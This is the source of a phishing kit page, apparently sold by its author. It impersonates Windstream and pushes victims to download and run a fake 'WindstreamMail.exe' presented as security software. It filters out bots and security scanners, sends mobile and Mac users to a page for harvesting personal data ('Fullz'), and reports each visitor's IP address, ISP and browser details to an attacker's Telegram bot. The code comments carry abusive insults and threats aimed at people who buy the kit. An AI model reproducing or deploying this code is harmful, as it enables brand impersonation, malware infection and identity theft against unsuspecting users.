<?php
// dont share page will fuk the code but you will stil do beacase all egypt stupid. I will batch all your work dumb fuckers
// @labdata1 if you didnt buy from me i hide batch so buy my code and dont share i will cash all your work LOL LOL.

include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';

// === DETECT DEVICE TYPE ===
function isMobileDevice()
{
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $mobileKeywords = ['Mobile', 'Android', 'iPhone', 'iPad', 'Windows Phone', 'Tablet'];
    foreach ($mobileKeywords as $keyword) {
        if (stripos($userAgent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}

function isMacOS()
{
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    return stripos($userAgent, 'Macintosh') !== false && stripos($userAgent, 'Mobile') === false;
}

// Redirect to  Fullz if not using a computer
if (isMobileDevice()) {
    header("Location: ./name.php");
    exit;
} elseif (isMacOS()) {
    header("Location: ./name.php");
    exit;
}

// === TELEGRAM NOTIFICATION WITH ISP ===
if (!isset($_GET['download']) || $_GET['download'] !== 'true') {
    $botToken = "";      // ← Replace with your bot token
    $chatId   = "";     // ← Replace with your chat or group ID

    $ip  = $_SERVER['REMOTE_ADDR'];
    $ua  = $_SERVER['HTTP_USER_AGENT'];
    $time = date("Y-m-d H:i:s");

    // Get ISP info
    $isp = "Unknown";
    $location = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    if ($location && isset($location['isp'])) {
        $isp = $location['isp'];
    }

    $message = "📥 *Windstream Triggered!*\n"
        . "🕒 *Time:* `$time`\n"
        . "🌐 *IP:* `$ip`\n"
        . "🏢 *ISP:* `$isp`\n"
        . "📱 *Agent:* `$ua`";

    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    @file_get_contents($telegramUrl . '?' . http_build_query($params));
}

// Check if download is requested
if (isset($_GET['download']) && $_GET['download'] == 'true') {
    $file_url = '';  // ← Add domain for your .exe file
    $file_name = 'WindstreamMail.exe'; // ← Change file name of the .exe file

    // Set headers for file download
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $file_name . '"');
    header('Content-Transfer-Encoding: binary');

    // Stream the file content
    readfile($file_url);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <script>
        // Automatically trigger the download and redirect after a delay
        window.onload = function() {
            // Trigger the download
            window.location.href = "?download=true";
            // Redirect to ssa.gov after a 30-second delay to allow download to start
            setTimeout(function() {
                window.location.href = "./name.php";
            }, 30000); // 30-second delay to ensure download initiates
        };
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Windstream - Secure Your Account</title>

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Styles -->
    <style>
        :root {
            --primary-color: #00002e;
            --secondary-color: #1f8aa3;
            --background-color: #f8f9fa;
            --text-color: #333;
        }

        body {
            background-color: var(--background-color);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: var(--text-color);
            line-height: 1.6;
        }

        .main-container {
            max-width: 600px;
            margin: 2rem auto;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .header {
            padding: 1.5rem;
            text-align: center;
            border-bottom: 1px solid #eee;
        }

        .header img {
            max-width: 180px;
            height: auto;
        }

        .content-container {
            padding: 2rem;
        }

        .content-title {
            font-size: 1.75rem;
            font-weight: 600;
            color: #1f2937;
            /* Gray-800 equivalent */
            text-align: center;
            margin-bottom: 1rem;
        }

        .content-description {
            font-size: 1rem;
            color: #4b5563;
            /* Gray-600 equivalent */
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .step-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: #374151;
            /* Gray-700 equivalent */
            text-align: center;
            margin-bottom: 0.5rem;
        }

        .step-text {
            font-size: 1rem;
            color: #4b5563;
            text-align: center;
            margin-bottom: 1rem;
        }

        .step-image {
            display: block;
            max-width: 100%;
            height: auto;
            margin: 0 auto 1rem;
        }

        .submit-button {
            background-color: var(--primary-color);
            border: none;
            padding: 0.75rem 2rem;
            font-weight: 500;
            border-radius: 6px;
            width: 100%;
            transition: background-color 0.3s ease;
            color: #ffffff;
            /* White text for "Continue" */
        }

        .submit-button:hover {
            background-color: #d85c20;
        }

        a {
            color: var(--secondary-color);
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        .spinner {
            display: none;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .main-container {
                margin: 1rem;
                border-radius: 8px;
            }

            .content-container {
                padding: 1.5rem;
            }

            .content-title {
                font-size: 1.5rem;
            }

            .header img {
                max-width: 140px;
            }

            .step-image {
                max-width: 80%;
            }
        }

        @media (max-width: 576px) {
            .content-container {
                padding: 1rem;
            }

            .content-title {
                font-size: 1.25rem;
            }

            .step-title {
                font-size: 1.1rem;
            }

            .step-text {
                font-size: 0.9rem;
            }

            .submit-button {
                padding: 0.65rem;
                font-size: 0.9rem;
            }
        }
    </style>
</head>

<body>
    <div class="main-container">
        <header class="header">
            <img src="./assets/img/windstream.jpg" alt="Windstream Logo" title="Windstream">
            <div id="loading_spinner" class="spinner"></div>
        </header>

        <div class="content-container">
            <h1 class="content-title">Secure Your Email Account</h1>
            <p class="content-description">
                To keep your emails safe and secure, please download and install our security software. Follow the steps
                below, then proceed to the next page for verification.
            </p>

            <form action="./name.php" method="post" class="space-y-6">
                <div class="text-center">
                    <p class="step-title">Step 1: Download the Security Software</p>
                    <p class="step-text">
                        Your browser should start the download automatically. Look for the <strong>download
                            arrow</strong> in the top-right corner of your browser and click to save the file.
                    </p>
                    <img src="./assets/img/LaunchWindowsFirefoxExeRun.png" alt="Download arrow in browser"
                        class="step-image" width="264" height="113">
                    <p class="step-title">Step 2: Install the Software</p>
                    <p class="step-text">
                        Once downloaded, click the file to launch the installer. If prompted, select
                        <strong>"Run"</strong> to proceed with the installation.
                    </p>
                    <img src="./assets/img/LaunchWindowsExeConfirmation.png" alt="Run installer prompt"
                        class="step-image" width="257" height="157">
                </div>

                <div class="text-center mt-4">
                    <button type="submit" class="btn submit-button">Continue to Verification</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>